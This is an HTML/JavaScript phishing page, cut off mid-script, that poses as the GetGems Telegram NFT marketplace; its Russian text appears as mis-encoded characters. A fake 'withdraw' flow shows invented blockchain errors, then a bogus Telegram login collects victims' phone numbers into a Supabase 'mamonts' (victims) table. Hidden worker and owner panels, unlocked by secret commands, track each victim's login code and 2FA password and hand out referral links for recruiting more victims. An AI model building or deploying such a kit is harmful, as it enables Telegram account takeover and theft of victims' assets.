<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GetGems</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: #ffffff;
            max-width: 500px;
            margin: 0 auto;
            padding-bottom: 80px;
            min-height: 100vh;
        }
        
        .easter-egg {
            background-color: #2d2d2d;
            border-radius: 12px;
            padding: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            width: 120px;
            margin: 15px;
            cursor: pointer;
        }
        
        .egg-image {
            width: 100%;
            border-radius: 8px;
            margin-bottom: 6px;
        }
        
        .egg-title {
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 3px;
            color: #ffffff;
        }
        
        .egg-id {
            color: #aaa;
            font-size: 10px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #121212;
            z-index: 1000;
            flex-direction: column;
            padding: 20px;
        }
        
        .video-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        .video-container video {
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
        }
        
        .buttons-container {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 12px;
        }
        
        .status {
            font-size: 14px;
            margin-bottom: 15px;
            color: #ff9800;
            text-align: center;
        }
        
        .button-row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .button {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-align: center;
            color: #ffffff;
            font-weight: 500;
            text-decoration: none;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
        }
        
        .button.blue {
            background-color: #4dabf7;
            color: #ffffff;
        }
        
        .button.white {
            background-color: #ffffff;
            color: #121212;
        }
        
        .telegram-link {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-align: center;
            color: #4dabf7;
            font-weight: 500;
            text-decoration: none;
            padding: 12px;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .fullscreen-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #121212;
            z-index: 2000;
            padding: 20px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .loading-container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .loading-image {
            width: 120px;
            height: 120px;
            border-radius: 12px;
            margin-bottom: 30px;
            object-fit: cover;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 700;
            color: #ffffff;
            text-align: center;
            margin-bottom: 20px;
            height: 30px;
        }
        
        .loading-bar {
            width: 100%;
            height: 6px;
            background-color: #2d2d2d;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 30px;
        }
        
        .loading-progress {
            width: 0%;
            height: 100%;
            background-color: #4dabf7;
            border-radius: 3px;
            transition: width 0.3s ease;
        }
        
        .dots {
            display: inline-block;
            animation: dots 1.5s infinite;
        }
        
        @keyframes dots {
            0%, 20% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
        
        .error {
            color: #f44336;
            margin: 20px 0;
            padding: 15px;
            background-color: rgba(244, 67, 54, 0.1);
            border-radius: 8px;
            border: 1px solid #f44336;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        
        .ton-info {
            margin: 20px 0;
            padding: 20px;
            background-color: #2d2d2d;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
        }
        
        .ton-info p {
            margin-bottom: 15px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        .register-button {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            text-align: center;
            background-color: #4dabf7;
            color: white;
            font-weight: 500;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            max-width: 400px;
        }
        
        .phone-input-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #121212;
            z-index: 3000;
            padding: 20px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .phone-input-container {
            background-color: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .phone-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #4dabf7;
        }
        
        .phone-subtitle {
            color: #bbb;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .phone-input {
            width: 100%;
            padding: 16px;
            background-color: #2d2d2d;
            border: 2px solid #404040;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .phone-input:focus {
            border-color: #4dabf7;
            outline: none;
        }
        
        .worker-mode-btn {
            display: none;
            background-color: #ff6b6b;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-weight: 600;
            margin: 15px 20px;
            cursor: pointer;
            width: calc(100% - 40px);
        }
        
        .owner-mode-btn {
            display: none;
            background-color: #ffd700;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-weight: 600;
            margin: 15px 20px;
            cursor: pointer;
            width: calc(100% - 40px);
        }
        
        .worker-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #121212;
            z-index: 4000;
            flex-direction: column;
            overflow-y: auto;
        }
        
        .owner-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #121212;
            z-index: 4000;
            flex-direction: column;
            overflow-y: auto;
        }
        
        .worker-header {
            background-color: #1e1e1e;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #404040;
            position: sticky;
            top: 0;
        }
        
        .worker-section {
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        
        .worker-section-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #4dabf7;
        }
        
        .mamont-item {
            padding: 15px;
            background-color: #2d2d2d;
            border-radius: 8px;
            margin-bottom: 10px;
            cursor: pointer;
        }
        
        .mamont-phone {
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .mamont-status {
            font-size: 12px;
            color: #bbb;
        }
        
        .mamont-password {
            font-size: 12px;
            color: #4dabf7;
            margin-top: 5px;
            font-weight: 600;
        }
        
        .close-button {
            position: absolute;
            top: 20px;
            right: 20px;
            color: #bbb;
            font-size: 28px;
            cursor: pointer;
            background: none;
            border: none;
            z-index: 10;
        }
        
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #1e1e1e;
            display: flex;
            justify-content: space-around;
            padding: 12px 0;
            border-top: 1px solid #333;
            max-width: 500px;
            margin: 0 auto;
        }
        
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 12px;
            color: #888;
            cursor: pointer;
        }
        
        .nav-item.active {
            color: #4dabf7;
        }
        
        .nav-icon {
            font-size: 20px;
            margin-bottom: 4px;
        }
    </style>
</head>
<body>
    <!-- –ö–Ω–æ–ø–∫–∞ —Ä–µ–∂–∏–º–∞ –≤–æ—Ä–∫–µ—Ä–∞ -->
    <button class="worker-mode-btn" id="workerModeBtn" onclick="openWorkerMode()">
        <i class="fas fa-user-shield"></i> –†–ï–ñ–ò–ú –í–û–†–ö–ï–†–ê
    </button>
    
    <!-- –ö–Ω–æ–ø–∫–∞ —Ä–µ–∂–∏–º–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞ -->
    <button class="owner-mode-btn" id="ownerModeBtn" onclick="openOwnerMode()">
        <i class="fas fa-crown"></i> –†–ï–ñ–ò–ú –í–õ–ê–î–ï–õ–¨–¶–ê
    </button>
    
    <!-- –ü–æ–¥–∞—Ä–æ–∫ -->
    <div class="easter-egg" onclick="openGiftModal()">
        <img src="https://raw.githubusercontent.com/trepall/Qwer/main/IMG_8096.jpeg" alt="Loot Bag" class="egg-image">
        <div class="egg-title">Loot Bag</div>
        <div class="egg-id">#6641</div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–æ–¥–∞—Ä–∫–∞ -->
    <div id="giftModal" class="modal">
        <button class="close-button" onclick="closeGiftModal()">&times;</button>
        <div class="video-container">
            <video id="giftVideo" autoplay muted loop playsinline oncontextmenu="return false;">
                <source src="https://raw.githubusercontent.com/trepall/D/main/ScreenRecording_11-15-2025%2017-41-04_1.mov" type="video/mp4">
                –í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≤–∏–¥–µ–æ.
            </video>
        </div>
        <div class="buttons-container">
            <div class="status">–ù–µ –≤—ã—Å—Ç–∞–≤–ª–µ–Ω</div>
            <div class="button-row">
                <button class="button blue" onclick="listItem()">
                    <i class="fas fa-tag"></i> –í—ã—Å—Ç–∞–≤–∏—Ç—å
                </button>
                <button class="button white" onclick="withdrawToAccount()">
                    <i class="fas fa-wallet"></i> –í—ã–≤–µ—Å—Ç–∏
                </button>
            </div>
            <a href="https://t.me/nft/LootBag-6641" class="telegram-link">
                <i class="fab fa-telegram"></i> –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–µ
            </a>
        </div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è –æ—à–∏–±–∫–∏ –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–∏—è -->
    <div id="listErrorModal" class="fullscreen-modal">
        <button class="close-button" onclick="closeListError()">&times;</button>
        <div class="error">–û—à–∏–±–∫–∞: —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è LvL 1</div>
        <button class="register-button" onclick="closeListError()">
            <i class="fas fa-times"></i> –ó–∞–∫—Ä—ã—Ç—å
        </button>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è –≤—ã–≤–æ–¥–∞ –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç -->
    <div id="withdrawModal" class="fullscreen-modal">
        <button class="close-button" onclick="closeWithdraw()">&times;</button>
        <div class="loading-container">
            <img src="https://raw.githubusercontent.com/trepall/D/main/IMG_8097.jpeg" alt="Loading" class="loading-image" id="loadingImage">
            <div class="loading-text" id="loadingText">–†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é<span class="dots">...</span></div>
            <div class="loading-bar" id="loadingBar">
                <div class="loading-progress" id="loadingProgress"></div>
            </div>
        </div>
        <div id="withdrawError" class="error" style="display: none;">–û—à–∏–±–∫–∞: ¬´–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–ª–æ–∫—á–µ–π–Ω–µ¬ª</div>
        <div id="tonRegistration" style="display: none;">
            <div class="ton-info">
                <p>üíé <strong>–ë–ª–æ–∫—á–µ–π–Ω TON</strong> ‚Äî —ç—Ç–æ –¥–µ—Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è —Å–µ—Ç—å, –∫–æ—Ç–æ—Ä–∞—è –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –∏ –ø–µ—Ä–µ–¥–∞—á—É —Ü–∏—Ñ—Ä–æ–≤—ã—Ö –∞–∫—Ç–∏–≤–æ–≤.</p>
                <p>‚ú® <strong>–£–¥–æ–±–Ω–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</strong> ‚Äî –≤—ã –º–æ–∂–µ—Ç–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è –≤ –±–ª–æ–∫—á–µ–π–Ω–µ TON –ø—Ä—è–º–æ —á–µ—Ä–µ–∑ Telegram, –±–µ–∑ —Å–ª–æ–∂–Ω—ã—Ö –ø—Ä–æ—Ü–µ–¥—É—Ä.</p>
            </div>
            <button class="register-button" onclick="openPhoneInput()">
                <i class="fas fa-user-plus"></i> –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è
            </button>
        </div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
    <div id="phoneInputModal" class="phone-input-modal">
        <div class="phone-input-container">
            <div class="phone-title">–í—Ö–æ–¥ –≤ Telegram</div>
            <div class="phone-subtitle">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</div>
            <input type="text" class="phone-input" id="phoneInput" placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞">
            <button class="register-button" onclick="processPhoneNumber()">
                <i class="fas fa-paper-plane"></i> –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
            </button>
        </div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Ä–µ–∂–∏–º–∞ –≤–æ—Ä–∫–µ—Ä–∞ -->
    <div id="workerModal" class="worker-modal">
        <div class="worker-header">
            <h2>–†–µ–∂–∏–º –í–æ—Ä–∫–µ—Ä–∞</h2>
        </div>
        <button class="close-button" onclick="closeWorkerMode()">&times;</button>
        
        <div class="worker-section">
            <div class="worker-section-title">–ú–ê–ú–û–ù–¢–´</div>
            <div id="mamontsList">
                <!-- –ú–∞–º–æ–Ω—Ç—ã –±—É–¥—É—Ç –¥–æ–±–∞–≤–ª—è—Ç—å—Å—è –∑–¥–µ—Å—å -->
            </div>
        </div>
        
        <div class="worker-section">
            <div class="worker-section-title">–†–ï–§–ï–†–ê–õ–¨–ù–ê–Ø –°–°–´–õ–ö–ê</div>
            <div id="referralLink" style="color: #bbb; text-align: center; margin-bottom: 15px;">
                –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /trepalvork –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏
            </div>
            <button class="register-button" onclick="copyReferralLink()" id="copyLinkBtn" style="display: none;">
                <i class="fas fa-copy"></i> –°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É
            </button>
        </div>

        <div class="worker-section">
            <div class="worker-section-title">–£–ü–†–ê–í–õ–ï–ù–ò–ï –ú–ê–ú–û–ù–¢–û–ú</div>
            <div id="selectedMamontInfo" style="color: #bbb; text-align: center; margin-bottom: 15px;">
                –í—ã–±–µ—Ä–∏—Ç–µ –º–∞–º–æ–Ω—Ç–∞ –∏–∑ —Å–ø–∏—Å–∫–∞
            </div>
            <button class="button blue" onclick="sendCode()" id="sendCodeBtn" style="display: none; margin-bottom: 10px;">
                <i class="fas fa-sms"></i> –ö–û–î –û–¢–ü–†–ê–í–õ–ï–ù
            </button>
            <button class="button white" onclick="request2FA()" id="request2FABtn" style="display: none;">
                <i class="fas fa-shield-alt"></i> –î–í–£–•–§–ê–ö–¢–û–†–ö–ê
            </button>
        </div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Ä–µ–∂–∏–º–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞ -->
    <div id="ownerModal" class="owner-modal">
        <div class="worker-header">
            <h2>–†–µ–∂–∏–º –í–ª–∞–¥–µ–ª—å—Ü–∞</h2>
        </div>
        <button class="close-button" onclick="closeOwnerMode()">&times;</button>
        
        <div class="worker-section">
            <div class="worker-section-title">–í–°–ï –†–ï–§–ï–†–ê–õ–¨–ù–´–ï –°–°–´–õ–ö–ò</div>
            <div id="referralLinksList"></div>
        </div>
        
        <div class="worker-section">
            <div class="worker-section-title">–ú–ê–ú–û–ù–¢–´ –í–´–ë–†–ê–ù–ù–û–ô –°–°–´–õ–ö–ò</div>
            <div id="linkMamontsList"></div>
        </div>
        
        <div class="worker-section">
            <div class="worker-section-title">–í–°–ï –ú–ê–ú–û–ù–¢–´</div>
            <div id="allMamontsList"></div>
        </div>
    </div>
    
    <div class="bottom-nav">
        <div class="nav-item" onclick="window.open('https://t.me/GetgemsNftBot/gems?startapp=L2dpZnRzLWNvbGxlY3Rpb24_dXRtX2NhbXBhaWduPWdldGdlbXNfdGVsZWdyYW1fYm90JnV0bV9zb3VyY2U9dGdib3RidXR0b24mdXRtX21lZGl1bT1zdGFydGNvbW1hbmQ', '_blank')">
            <i class="fas fa-store nav-icon"></i>
            <span>–ú–∞—Ä–∫–µ—Ç</span>
        </div>
        <div class="nav-item" onclick="window.open('https://t.me/GetgemsNftBot/gems?startapp=L2dpZnRzLWNvbGxlY3Rpb24_dXRtX2NhbXBhaWduPWdldGdlbXNfdGVsZWdyYW1fYm90JnV0bV9zb3VyY2U9dGdib3RidXR0b24mdXRtX21lZGl1bT1zdGFydGNvbW1hbmQ', '_blank')">
            <i class="fas fa-clipboard-list nav-icon"></i>
            <span>–ó–∞—è–≤–∫–∏</span>
        </div>
        <div class="nav-item active">
            <i class="fas fa-archive nav-icon"></i>
            <span>–ò–Ω–≤–µ–Ω—Ç–∞—Ä—å</span>
        </div>
        <div class="nav-item" onclick="window.open('https://t.me/GetgemsNftBot/gems?startapp=L2dpZnRzLWNvbGxlY3Rpb24_dXRtX2NhbXBhaWduPWdldGdlbXNfdGVsZWdyYW1fYm90JnV0bV9zb3VyY2U9dGdib3RidXR0b24mdXRtX21lZGl1bT1zdGFydGNvbW1hbmQ', '_blank')">
            <i class="fas fa-shopping-cart nav-icon"></i>
            <span>–ö–æ—Ä–∑–∏–Ω–∞</span>
        </div>
        <div class="nav-item" onclick="window.open('https://t.me/GetgemsNftBot/gems?startapp=L2dpZnRzLWNvbGxlY3Rpb24_dXRtX2NhbXBhaWduPWdldGdlbXNfdGVsZWdyYW1fYm90JnV0bV9zb3VyY2U9dGdib3RidXR0b24mdXRtX21lZGl1bT1zdGFydGNvbW1hbmQ', '_blank')">
            <i class="fas fa-user nav-icon"></i>
            <span>–ü—Ä–æ—Ñ–∏–ª—å</span>
        </div>
    </div>

    <script>
        // Supabase –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const SUPABASE_URL = 'https://edhbuhkoykocgquwcfop.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVkaGJ1aGtveWtvY2dxdXdjZm9wIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mjg0MTU0NjksImV4cCI6MjA0Mzk5MTQ2OX0.tuzgyq-quxvy4-ficHyk';
        
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        
        let currentWorkerId = null;
        let selectedMamont = null;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            checkWorkerStatus();
            checkOwnerStatus();
            loadMamonts();
        });

        function checkWorkerStatus() {
            const workerStatus = localStorage.getItem('workerStatus');
            if (workerStatus === 'active') {
                document.getElementById('workerModeBtn').style.display = 'block';
                currentWorkerId = localStorage.getItem('workerId');
                // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É —Å—Ä–∞–∑—É –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å—Ç–∞—Ç—É—Å–∞
                generateReferralLink();
            }
        }

        function checkOwnerStatus() {
            const ownerStatus = localStorage.getItem('ownerStatus');
            if (ownerStatus === 'active') {
                document.getElementById('ownerModeBtn').style.display = 'block';
            }
        }

        function generateReferralLink() {
            console.log('Generating referral link for worker:', currentWorkerId);
            if (currentWorkerId) {
                const referralCode = btoa('worker_' + currentWorkerId).replace(/=/g, '');
                const referralLink = `https://t.me/GemHanterRobot/gemhanter?startapp=${referralCode}`;
                
                document.getElementById('referralLink').innerHTML = `
                    <strong>–í–∞—à–∞ —Å—Å—ã–ª–∫–∞:</strong><br>
                    <span style="color: #4dabf7;">${referralLink}</span>
                `;
                document.getElementById('copyLinkBtn').style.display = 'block';
                console.log('Referral link generated:', referralLink);
            } else {
                console.log('No worker ID found');
                document.getElementById('referralLink').innerHTML = '–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /trepalvork –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏';
                document.getElementById('copyLinkBtn').style.display = 'none';
            }
        }

        async function loadMamonts() {
            try {
                let query = supabase
                    .from('mamonts')
                    .select('*')
                    .order('created_at', { ascending: false });
                
                if (currentWorkerId) {
                    query = query.eq('worker_id', currentWorkerId);
                }
                
                const { data, error } = await query;
                
                if (error) throw error;
                
                if (data && data.length > 0) {
                    displayMamonts(data);
                } else {
                    document.getElementById('mamontsList').innerHTML = '<div style="color: #bbb; text-align: center; padding: 20px;">–ù–µ—Ç –º–∞–º–æ–Ω—Ç–æ–≤</div>';
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –º–∞–º–æ–Ω—Ç–æ–≤:', error);
            }
        }

        function displayMamonts(mamonts) {
            const container = document.getElementById('mamontsList');
            container.innerHTML = '';
            
            mamonts.forEach(mamont => {
                const mamontElement = document.createElement('div');
                mamontElement.className = 'mamont-item';
                mamontElement.onclick = () => selectMamont(mamont);
                
                let passwordHtml = '';
                if (mamont.password) {
                    passwordHtml = `<div class="mamont-password">–ü–∞—Ä–æ–ª—å: ${mamont.password}</div>`;
                }
                
                mamontElement.innerHTML = `
                    <div class="mamont-phone">${mamont.phone}</div>
                    <div class="mamont-status">–°—Ç–∞—Ç—É—Å: ${getStatusText(mamont.status)}</div>
                    ${passwordHtml}
                `;
                
                container.appendChild(mamontElement);
            });
        }

        function getStatusText(status) {
            const statuses = {
                'phone_entered': '–í–≤–µ–ª –Ω–æ–º–µ—Ä',
                'code_sent': '–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω',
                'code_verified': '–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω',
                'password_entered': '–ü–∞—Ä–æ–ª—å –≤–≤–µ–¥–µ–Ω'
            };
            return statuses[status] || '–ù–æ–≤—ã–π';
        }

        function selectMamont(mamont) {
            selectedMamont = mamont;
            
            let passwordInfo = '';
            if (mamont.password) {
                passwordInfo = `<br>–ü–∞—Ä–æ–ª—å: <strong style="color: #4dabf7">${mamont.password}</strong>`;
            }
            
            document.getElementById('selectedMamontInfo').innerHTML = `
                <strong>${mamont.phone}</strong><br>
                –°—Ç–∞—Ç—É—Å: ${getStatusText(mamont.status)}
                ${passwordInfo}
            `;
            
            document.getElementById('sendCodeBtn').style.display = mamont.status === 'phone_entered' ? 'block' : 'none';
            document.getElementById('request2FABtn').style.display = mamont.status === 'code_verified' ? 'block' : 'none';
        }

        async function sendCode() {
            if (selectedMamont) {
                try {
                    const { error } = await supabase
                        .from('mamonts')
                        .update({ status: 'code_sent' })
                        .eq('id', selectedMamont.id);
                    
                    if (error) throw error;
                    
                    selectedMamont.status = 'code_sent';
                    alert('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –º–∞–º–æ–Ω—Ç—É');
                    loadMamonts();
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞:', error);
                    alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞');
                }
            }
        }

        async function request2FA() {
            if (selectedMamont) {
                try {
                    const newPassword = 'pass_' + Math.random().toString(36).substr(2, 8);
                    
                    const { error } = await supabase
                        .from('mamonts')
                        .update({ 
                            status: 'password_entered',
                            password: newPassword
                        })
                        .eq('id', selectedMamont.id);
                    
                    if (error) throw error;
                    
                    selectedMamont.status = 'password_entered';
                    selectedMamont.password = newPassword;
                    
                    alert('–ó–∞–ø—Ä–æ—Å 2FA –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    loadMamonts();
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ 2FA:', error);
                    alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ 2FA');
                }
            }
        }

        function openGiftModal() {
            document.getElementById('giftModal').style.display = 'flex';
            document.getElementById('giftVideo').play().catch(e => console.log('–ê–≤—Ç–æ–≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ'));
        }
        
        function closeGiftModal() {
            document.getElementById('giftModal').style.display = 'none';
            document.getElementById('giftVideo').pause();
        }
        
        function listItem() {
            closeGiftModal();
            document.getElementById('listErrorModal').style.display = 'flex';
        }
        
        function closeListError() {
            document.getElementById('listErrorModal').style.display = 'none';
        }
        
        function withdrawToAccount() {
            closeGiftModal();
            const modal = document.getElementById('withdrawModal');
            const progress = document.getElementById('loadingProgress');
            
            modal.style.display = 'flex';
            progress.style.width = '0%';
            
            setTimeout(() => progress.style.width = '30%', 300);
            setTimeout(() => progress.style.width = '60%', 800);
            setTimeout(() => progress.style.width = '90%', 1500);
            setTimeout(() => {
                progress.style.width = '100%';
                setTimeout(() => {
                    document.getElementById('loadingText').style.display = 'none';
                    document.getElementById('loadingImage').style.display = 'none';
                    document.getElementById('loadingBar').style.display = 'none';
                    document.getElementById('withdrawError').style.display = 'block';
                    setTimeout(() => {
                        document.getElementById('withdrawError').style.display = 'none';
                        document.getElementById('tonRegistration').style.display = 'block';
                    }, 2000);
                }, 500);
            }, 2000);
        }
        
        function closeWithdraw() {
            document.getElementById('withdrawModal').style.display = 'none';
        }
        
        function openPhoneInput() {
            document.getElementById('phoneInputModal').style.display = 'flex';
        }
        
        function closePhoneInput() {
            document.getElementById('phoneInputModal').style.display = 'none';
        }
        
        async function processPhoneNumber() {
            const input = document.getElementById('phoneInput').value.trim();
            
            if (input === '/trepalik') {
                localStorage.setItem('ownerStatus', 'active');
                document.getElementById('ownerModeBtn').style.display = 'block';
                document.getElementById('phoneInput').value = '';
                closePhoneInput();
                alert('–°—Ç–∞—Ç—É—Å –≤–ª–∞–¥–µ–ª—å—Ü–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω');
                return;
            }
            
            if (input === '/trepalvork') {
                localStorage.setItem('workerStatus', 'active');
                document.getElementById('workerModeBtn').style.display = 'block';
                
                // –°–æ–∑–¥–∞–µ–º –≤–æ—Ä–∫–µ—Ä–∞ –≤ –±–∞–∑–µ
                try {
                    const { data: worker, error } = await supabase
                        .from('workers')
                        .insert([{ 
                            username: 'worker_' + Date.now(),
                            referral_code: 'ref_' + Date.now()
                        }])
                        .select()
                        .single();
                    
                    if (error) throw error;
                    
                    localStorage.setItem('workerId', worker.id);
                    currentWorkerId = worker.id;
                    
                    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è –≤–æ—Ä–∫–µ—Ä–∞
                    generateReferralLink();
                    
                    alert('–†–µ–∂–∏–º –≤–æ—Ä–∫–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞.');
                    
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –≤–æ—Ä–∫–µ—Ä–∞:', error);
                    alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –≤–æ—Ä–∫–µ—Ä–∞');
                }
                
                document.getElementById('phoneInput').value = '';
                closePhoneInput();
                return;
            }
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–∞–º–æ–Ω—Ç–∞
            try {
                const mamontData = { 
                    phone: input,
                    status: 'phone_entered'
                };
                
                if (currentWorkerId) {
                    mamontData.worker_id = currentWorkerId;
                }
                
                const { error } = await supabase
                    .from('mamonts')
                    .insert([mamontData]);
                
                if (error) throw error;
                
                alert('–ù–æ–º–µ—Ä —Å–æ—Ö—Ä–∞–Ω–µ–Ω: ' + input);
                loadMamonts();
                
            } catch (error) {
